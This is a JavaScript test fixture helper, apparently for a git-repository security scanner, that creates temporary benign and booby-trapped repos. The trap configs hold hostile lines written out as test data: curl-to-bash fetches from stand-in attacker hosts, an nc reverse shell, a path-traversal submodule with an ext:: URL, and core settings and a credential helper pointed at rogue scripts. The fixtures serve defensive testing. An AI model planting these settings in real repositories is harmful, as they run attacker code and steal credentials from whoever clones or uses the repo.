/**
 * Isolated Test Fixture Helper
 */

import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';

export function createIsolatedFixtures() {
  const baseDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gitambush-test-'));

  // 1. Benign Repo
  const benignDir = path.join(baseDir, 'benign-repo');
  fs.mkdirSync(path.join(benignDir, '.git', 'hooks'), { recursive: true });
  fs.writeFileSync(path.join(benignDir, '.git', 'config'), `
[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
\tignorecase = true
\tprecomposeunicode = true
[filter "lfs"]
\tclean = git-lfs clean -- %f
\tsmudge = git-lfs smudge -- %f
\tprocess = git-lfs filter-process
\trequired = true
`.trim());
  fs.writeFileSync(path.join(benignDir, '.gitattributes'), `
*.psd filter=lfs diff=lfs merge=lfs -text
*.zip filter=lfs diff=lfs merge=lfs -text
`.trim());
  fs.writeFileSync(path.join(benignDir, '.gitmodules'), `
[submodule "libs/engine"]
\tpath = libs/engine
\turl = https://github.com/engine/core.git
`.trim());
  fs.writeFileSync(path.join(benignDir, '.git', 'hooks', 'pre-commit.sample'), '#!/bin/sh\nexit 0\n');

  // 2. GitSpawn Repo (core.fsmonitor)
  const fsmonitorDir = path.join(baseDir, 'gitspawn-fsmonitor');
  fs.mkdirSync(path.join(fsmonitorDir, '.git'), { recursive: true });
  fs.writeFileSync(path.join(fsmonitorDir, '.git', 'config'), `
[core]
\trepositoryformatversion = 0
\tbare = false
\tfsmonitor = /tmp/evil_payload.sh
`.trim());

  // 3. Filter Poison Repo
  const filterDir = path.join(baseDir, 'filter-poison');
  fs.mkdirSync(path.join(filterDir, '.git'), { recursive: true });
  fs.writeFileSync(path.join(filterDir, '.git', 'config'), `
[core]
\tbare = false
[filter "pwn"]
\tsmudge = curl -s http://attacker.com/rev.sh | bash
\tclean = nc -e /bin/sh 10.0.0.1 4444
`.trim());
  fs.writeFileSync(path.join(filterDir, '.gitattributes'), `
*.md filter=pwn
`.trim());

  // 4. Submodule Trap Repo
  const subDir = path.join(baseDir, 'submodule-trap');
  fs.mkdirSync(path.join(subDir, '.git'), { recursive: true });
  fs.writeFileSync(path.join(subDir, '.gitmodules'), `
[submodule "rogue"]
\tpath = ../../../escaped
\turl = ext::sh -c evil%20payload
\tupdate = !sh -c 'touch /tmp/submodule_pwn'
`.trim());

  // 5. Hook Trap Repo
  const hookDir = path.join(baseDir, 'hook-trap');
  fs.mkdirSync(path.join(hookDir, '.git', 'hooks'), { recursive: true });
  const hookFile = path.join(hookDir, '.git', 'hooks', 'post-checkout');
  fs.writeFileSync(hookFile, '#!/bin/sh\necho "Malicious hook executed"\n');
  fs.chmodSync(hookFile, 0o755);

  // 6. Alias Escape Repo
  const aliasDir = path.join(baseDir, 'alias-escape');
  fs.mkdirSync(path.join(aliasDir, '.git'), { recursive: true });
  fs.writeFileSync(path.join(aliasDir, '.git', 'config'), `
[core]
\tbare = false
[alias]
\tco = checkout
\tst = !sh -c 'curl evil.com | bash'
`.trim());

  // 7. Full Weaponized Multitrap Repo
  const multiDir = path.join(baseDir, 'multi-trap');
  const rogueHooksDir = path.join(multiDir, '.githooks');
  fs.mkdirSync(path.join(multiDir, '.git'), { recursive: true });
  fs.mkdirSync(rogueHooksDir, { recursive: true });

  fs.writeFileSync(path.join(multiDir, '.git', 'config'), `
[core]
\tbare = false
\tfsmonitor = /tmp/fsmon.sh
\thooksPath = .githooks
\tpager = /tmp/evil_pager
\teditor = /tmp/evil_editor
\tsshCommand = /tmp/evil_ssh
[diff]
\texternal = /tmp/diff_exec
[credential]
\thelper = /tmp/steal_tokens.sh
[alias]
\tpwn = !sh -c 'calc'
`.trim());
  fs.writeFileSync(path.join(rogueHooksDir, 'pre-commit'), '#!/bin/sh\nexit 1\n');
  fs.chmodSync(path.join(rogueHooksDir, 'pre-commit'), 0o755);

  return {
    baseDir,
    cleanup: () => {
      try {
        fs.rmSync(baseDir, { recursive: true, force: true });
      } catch {
        // Ignore cleanup failure
      }
    }
  };
}
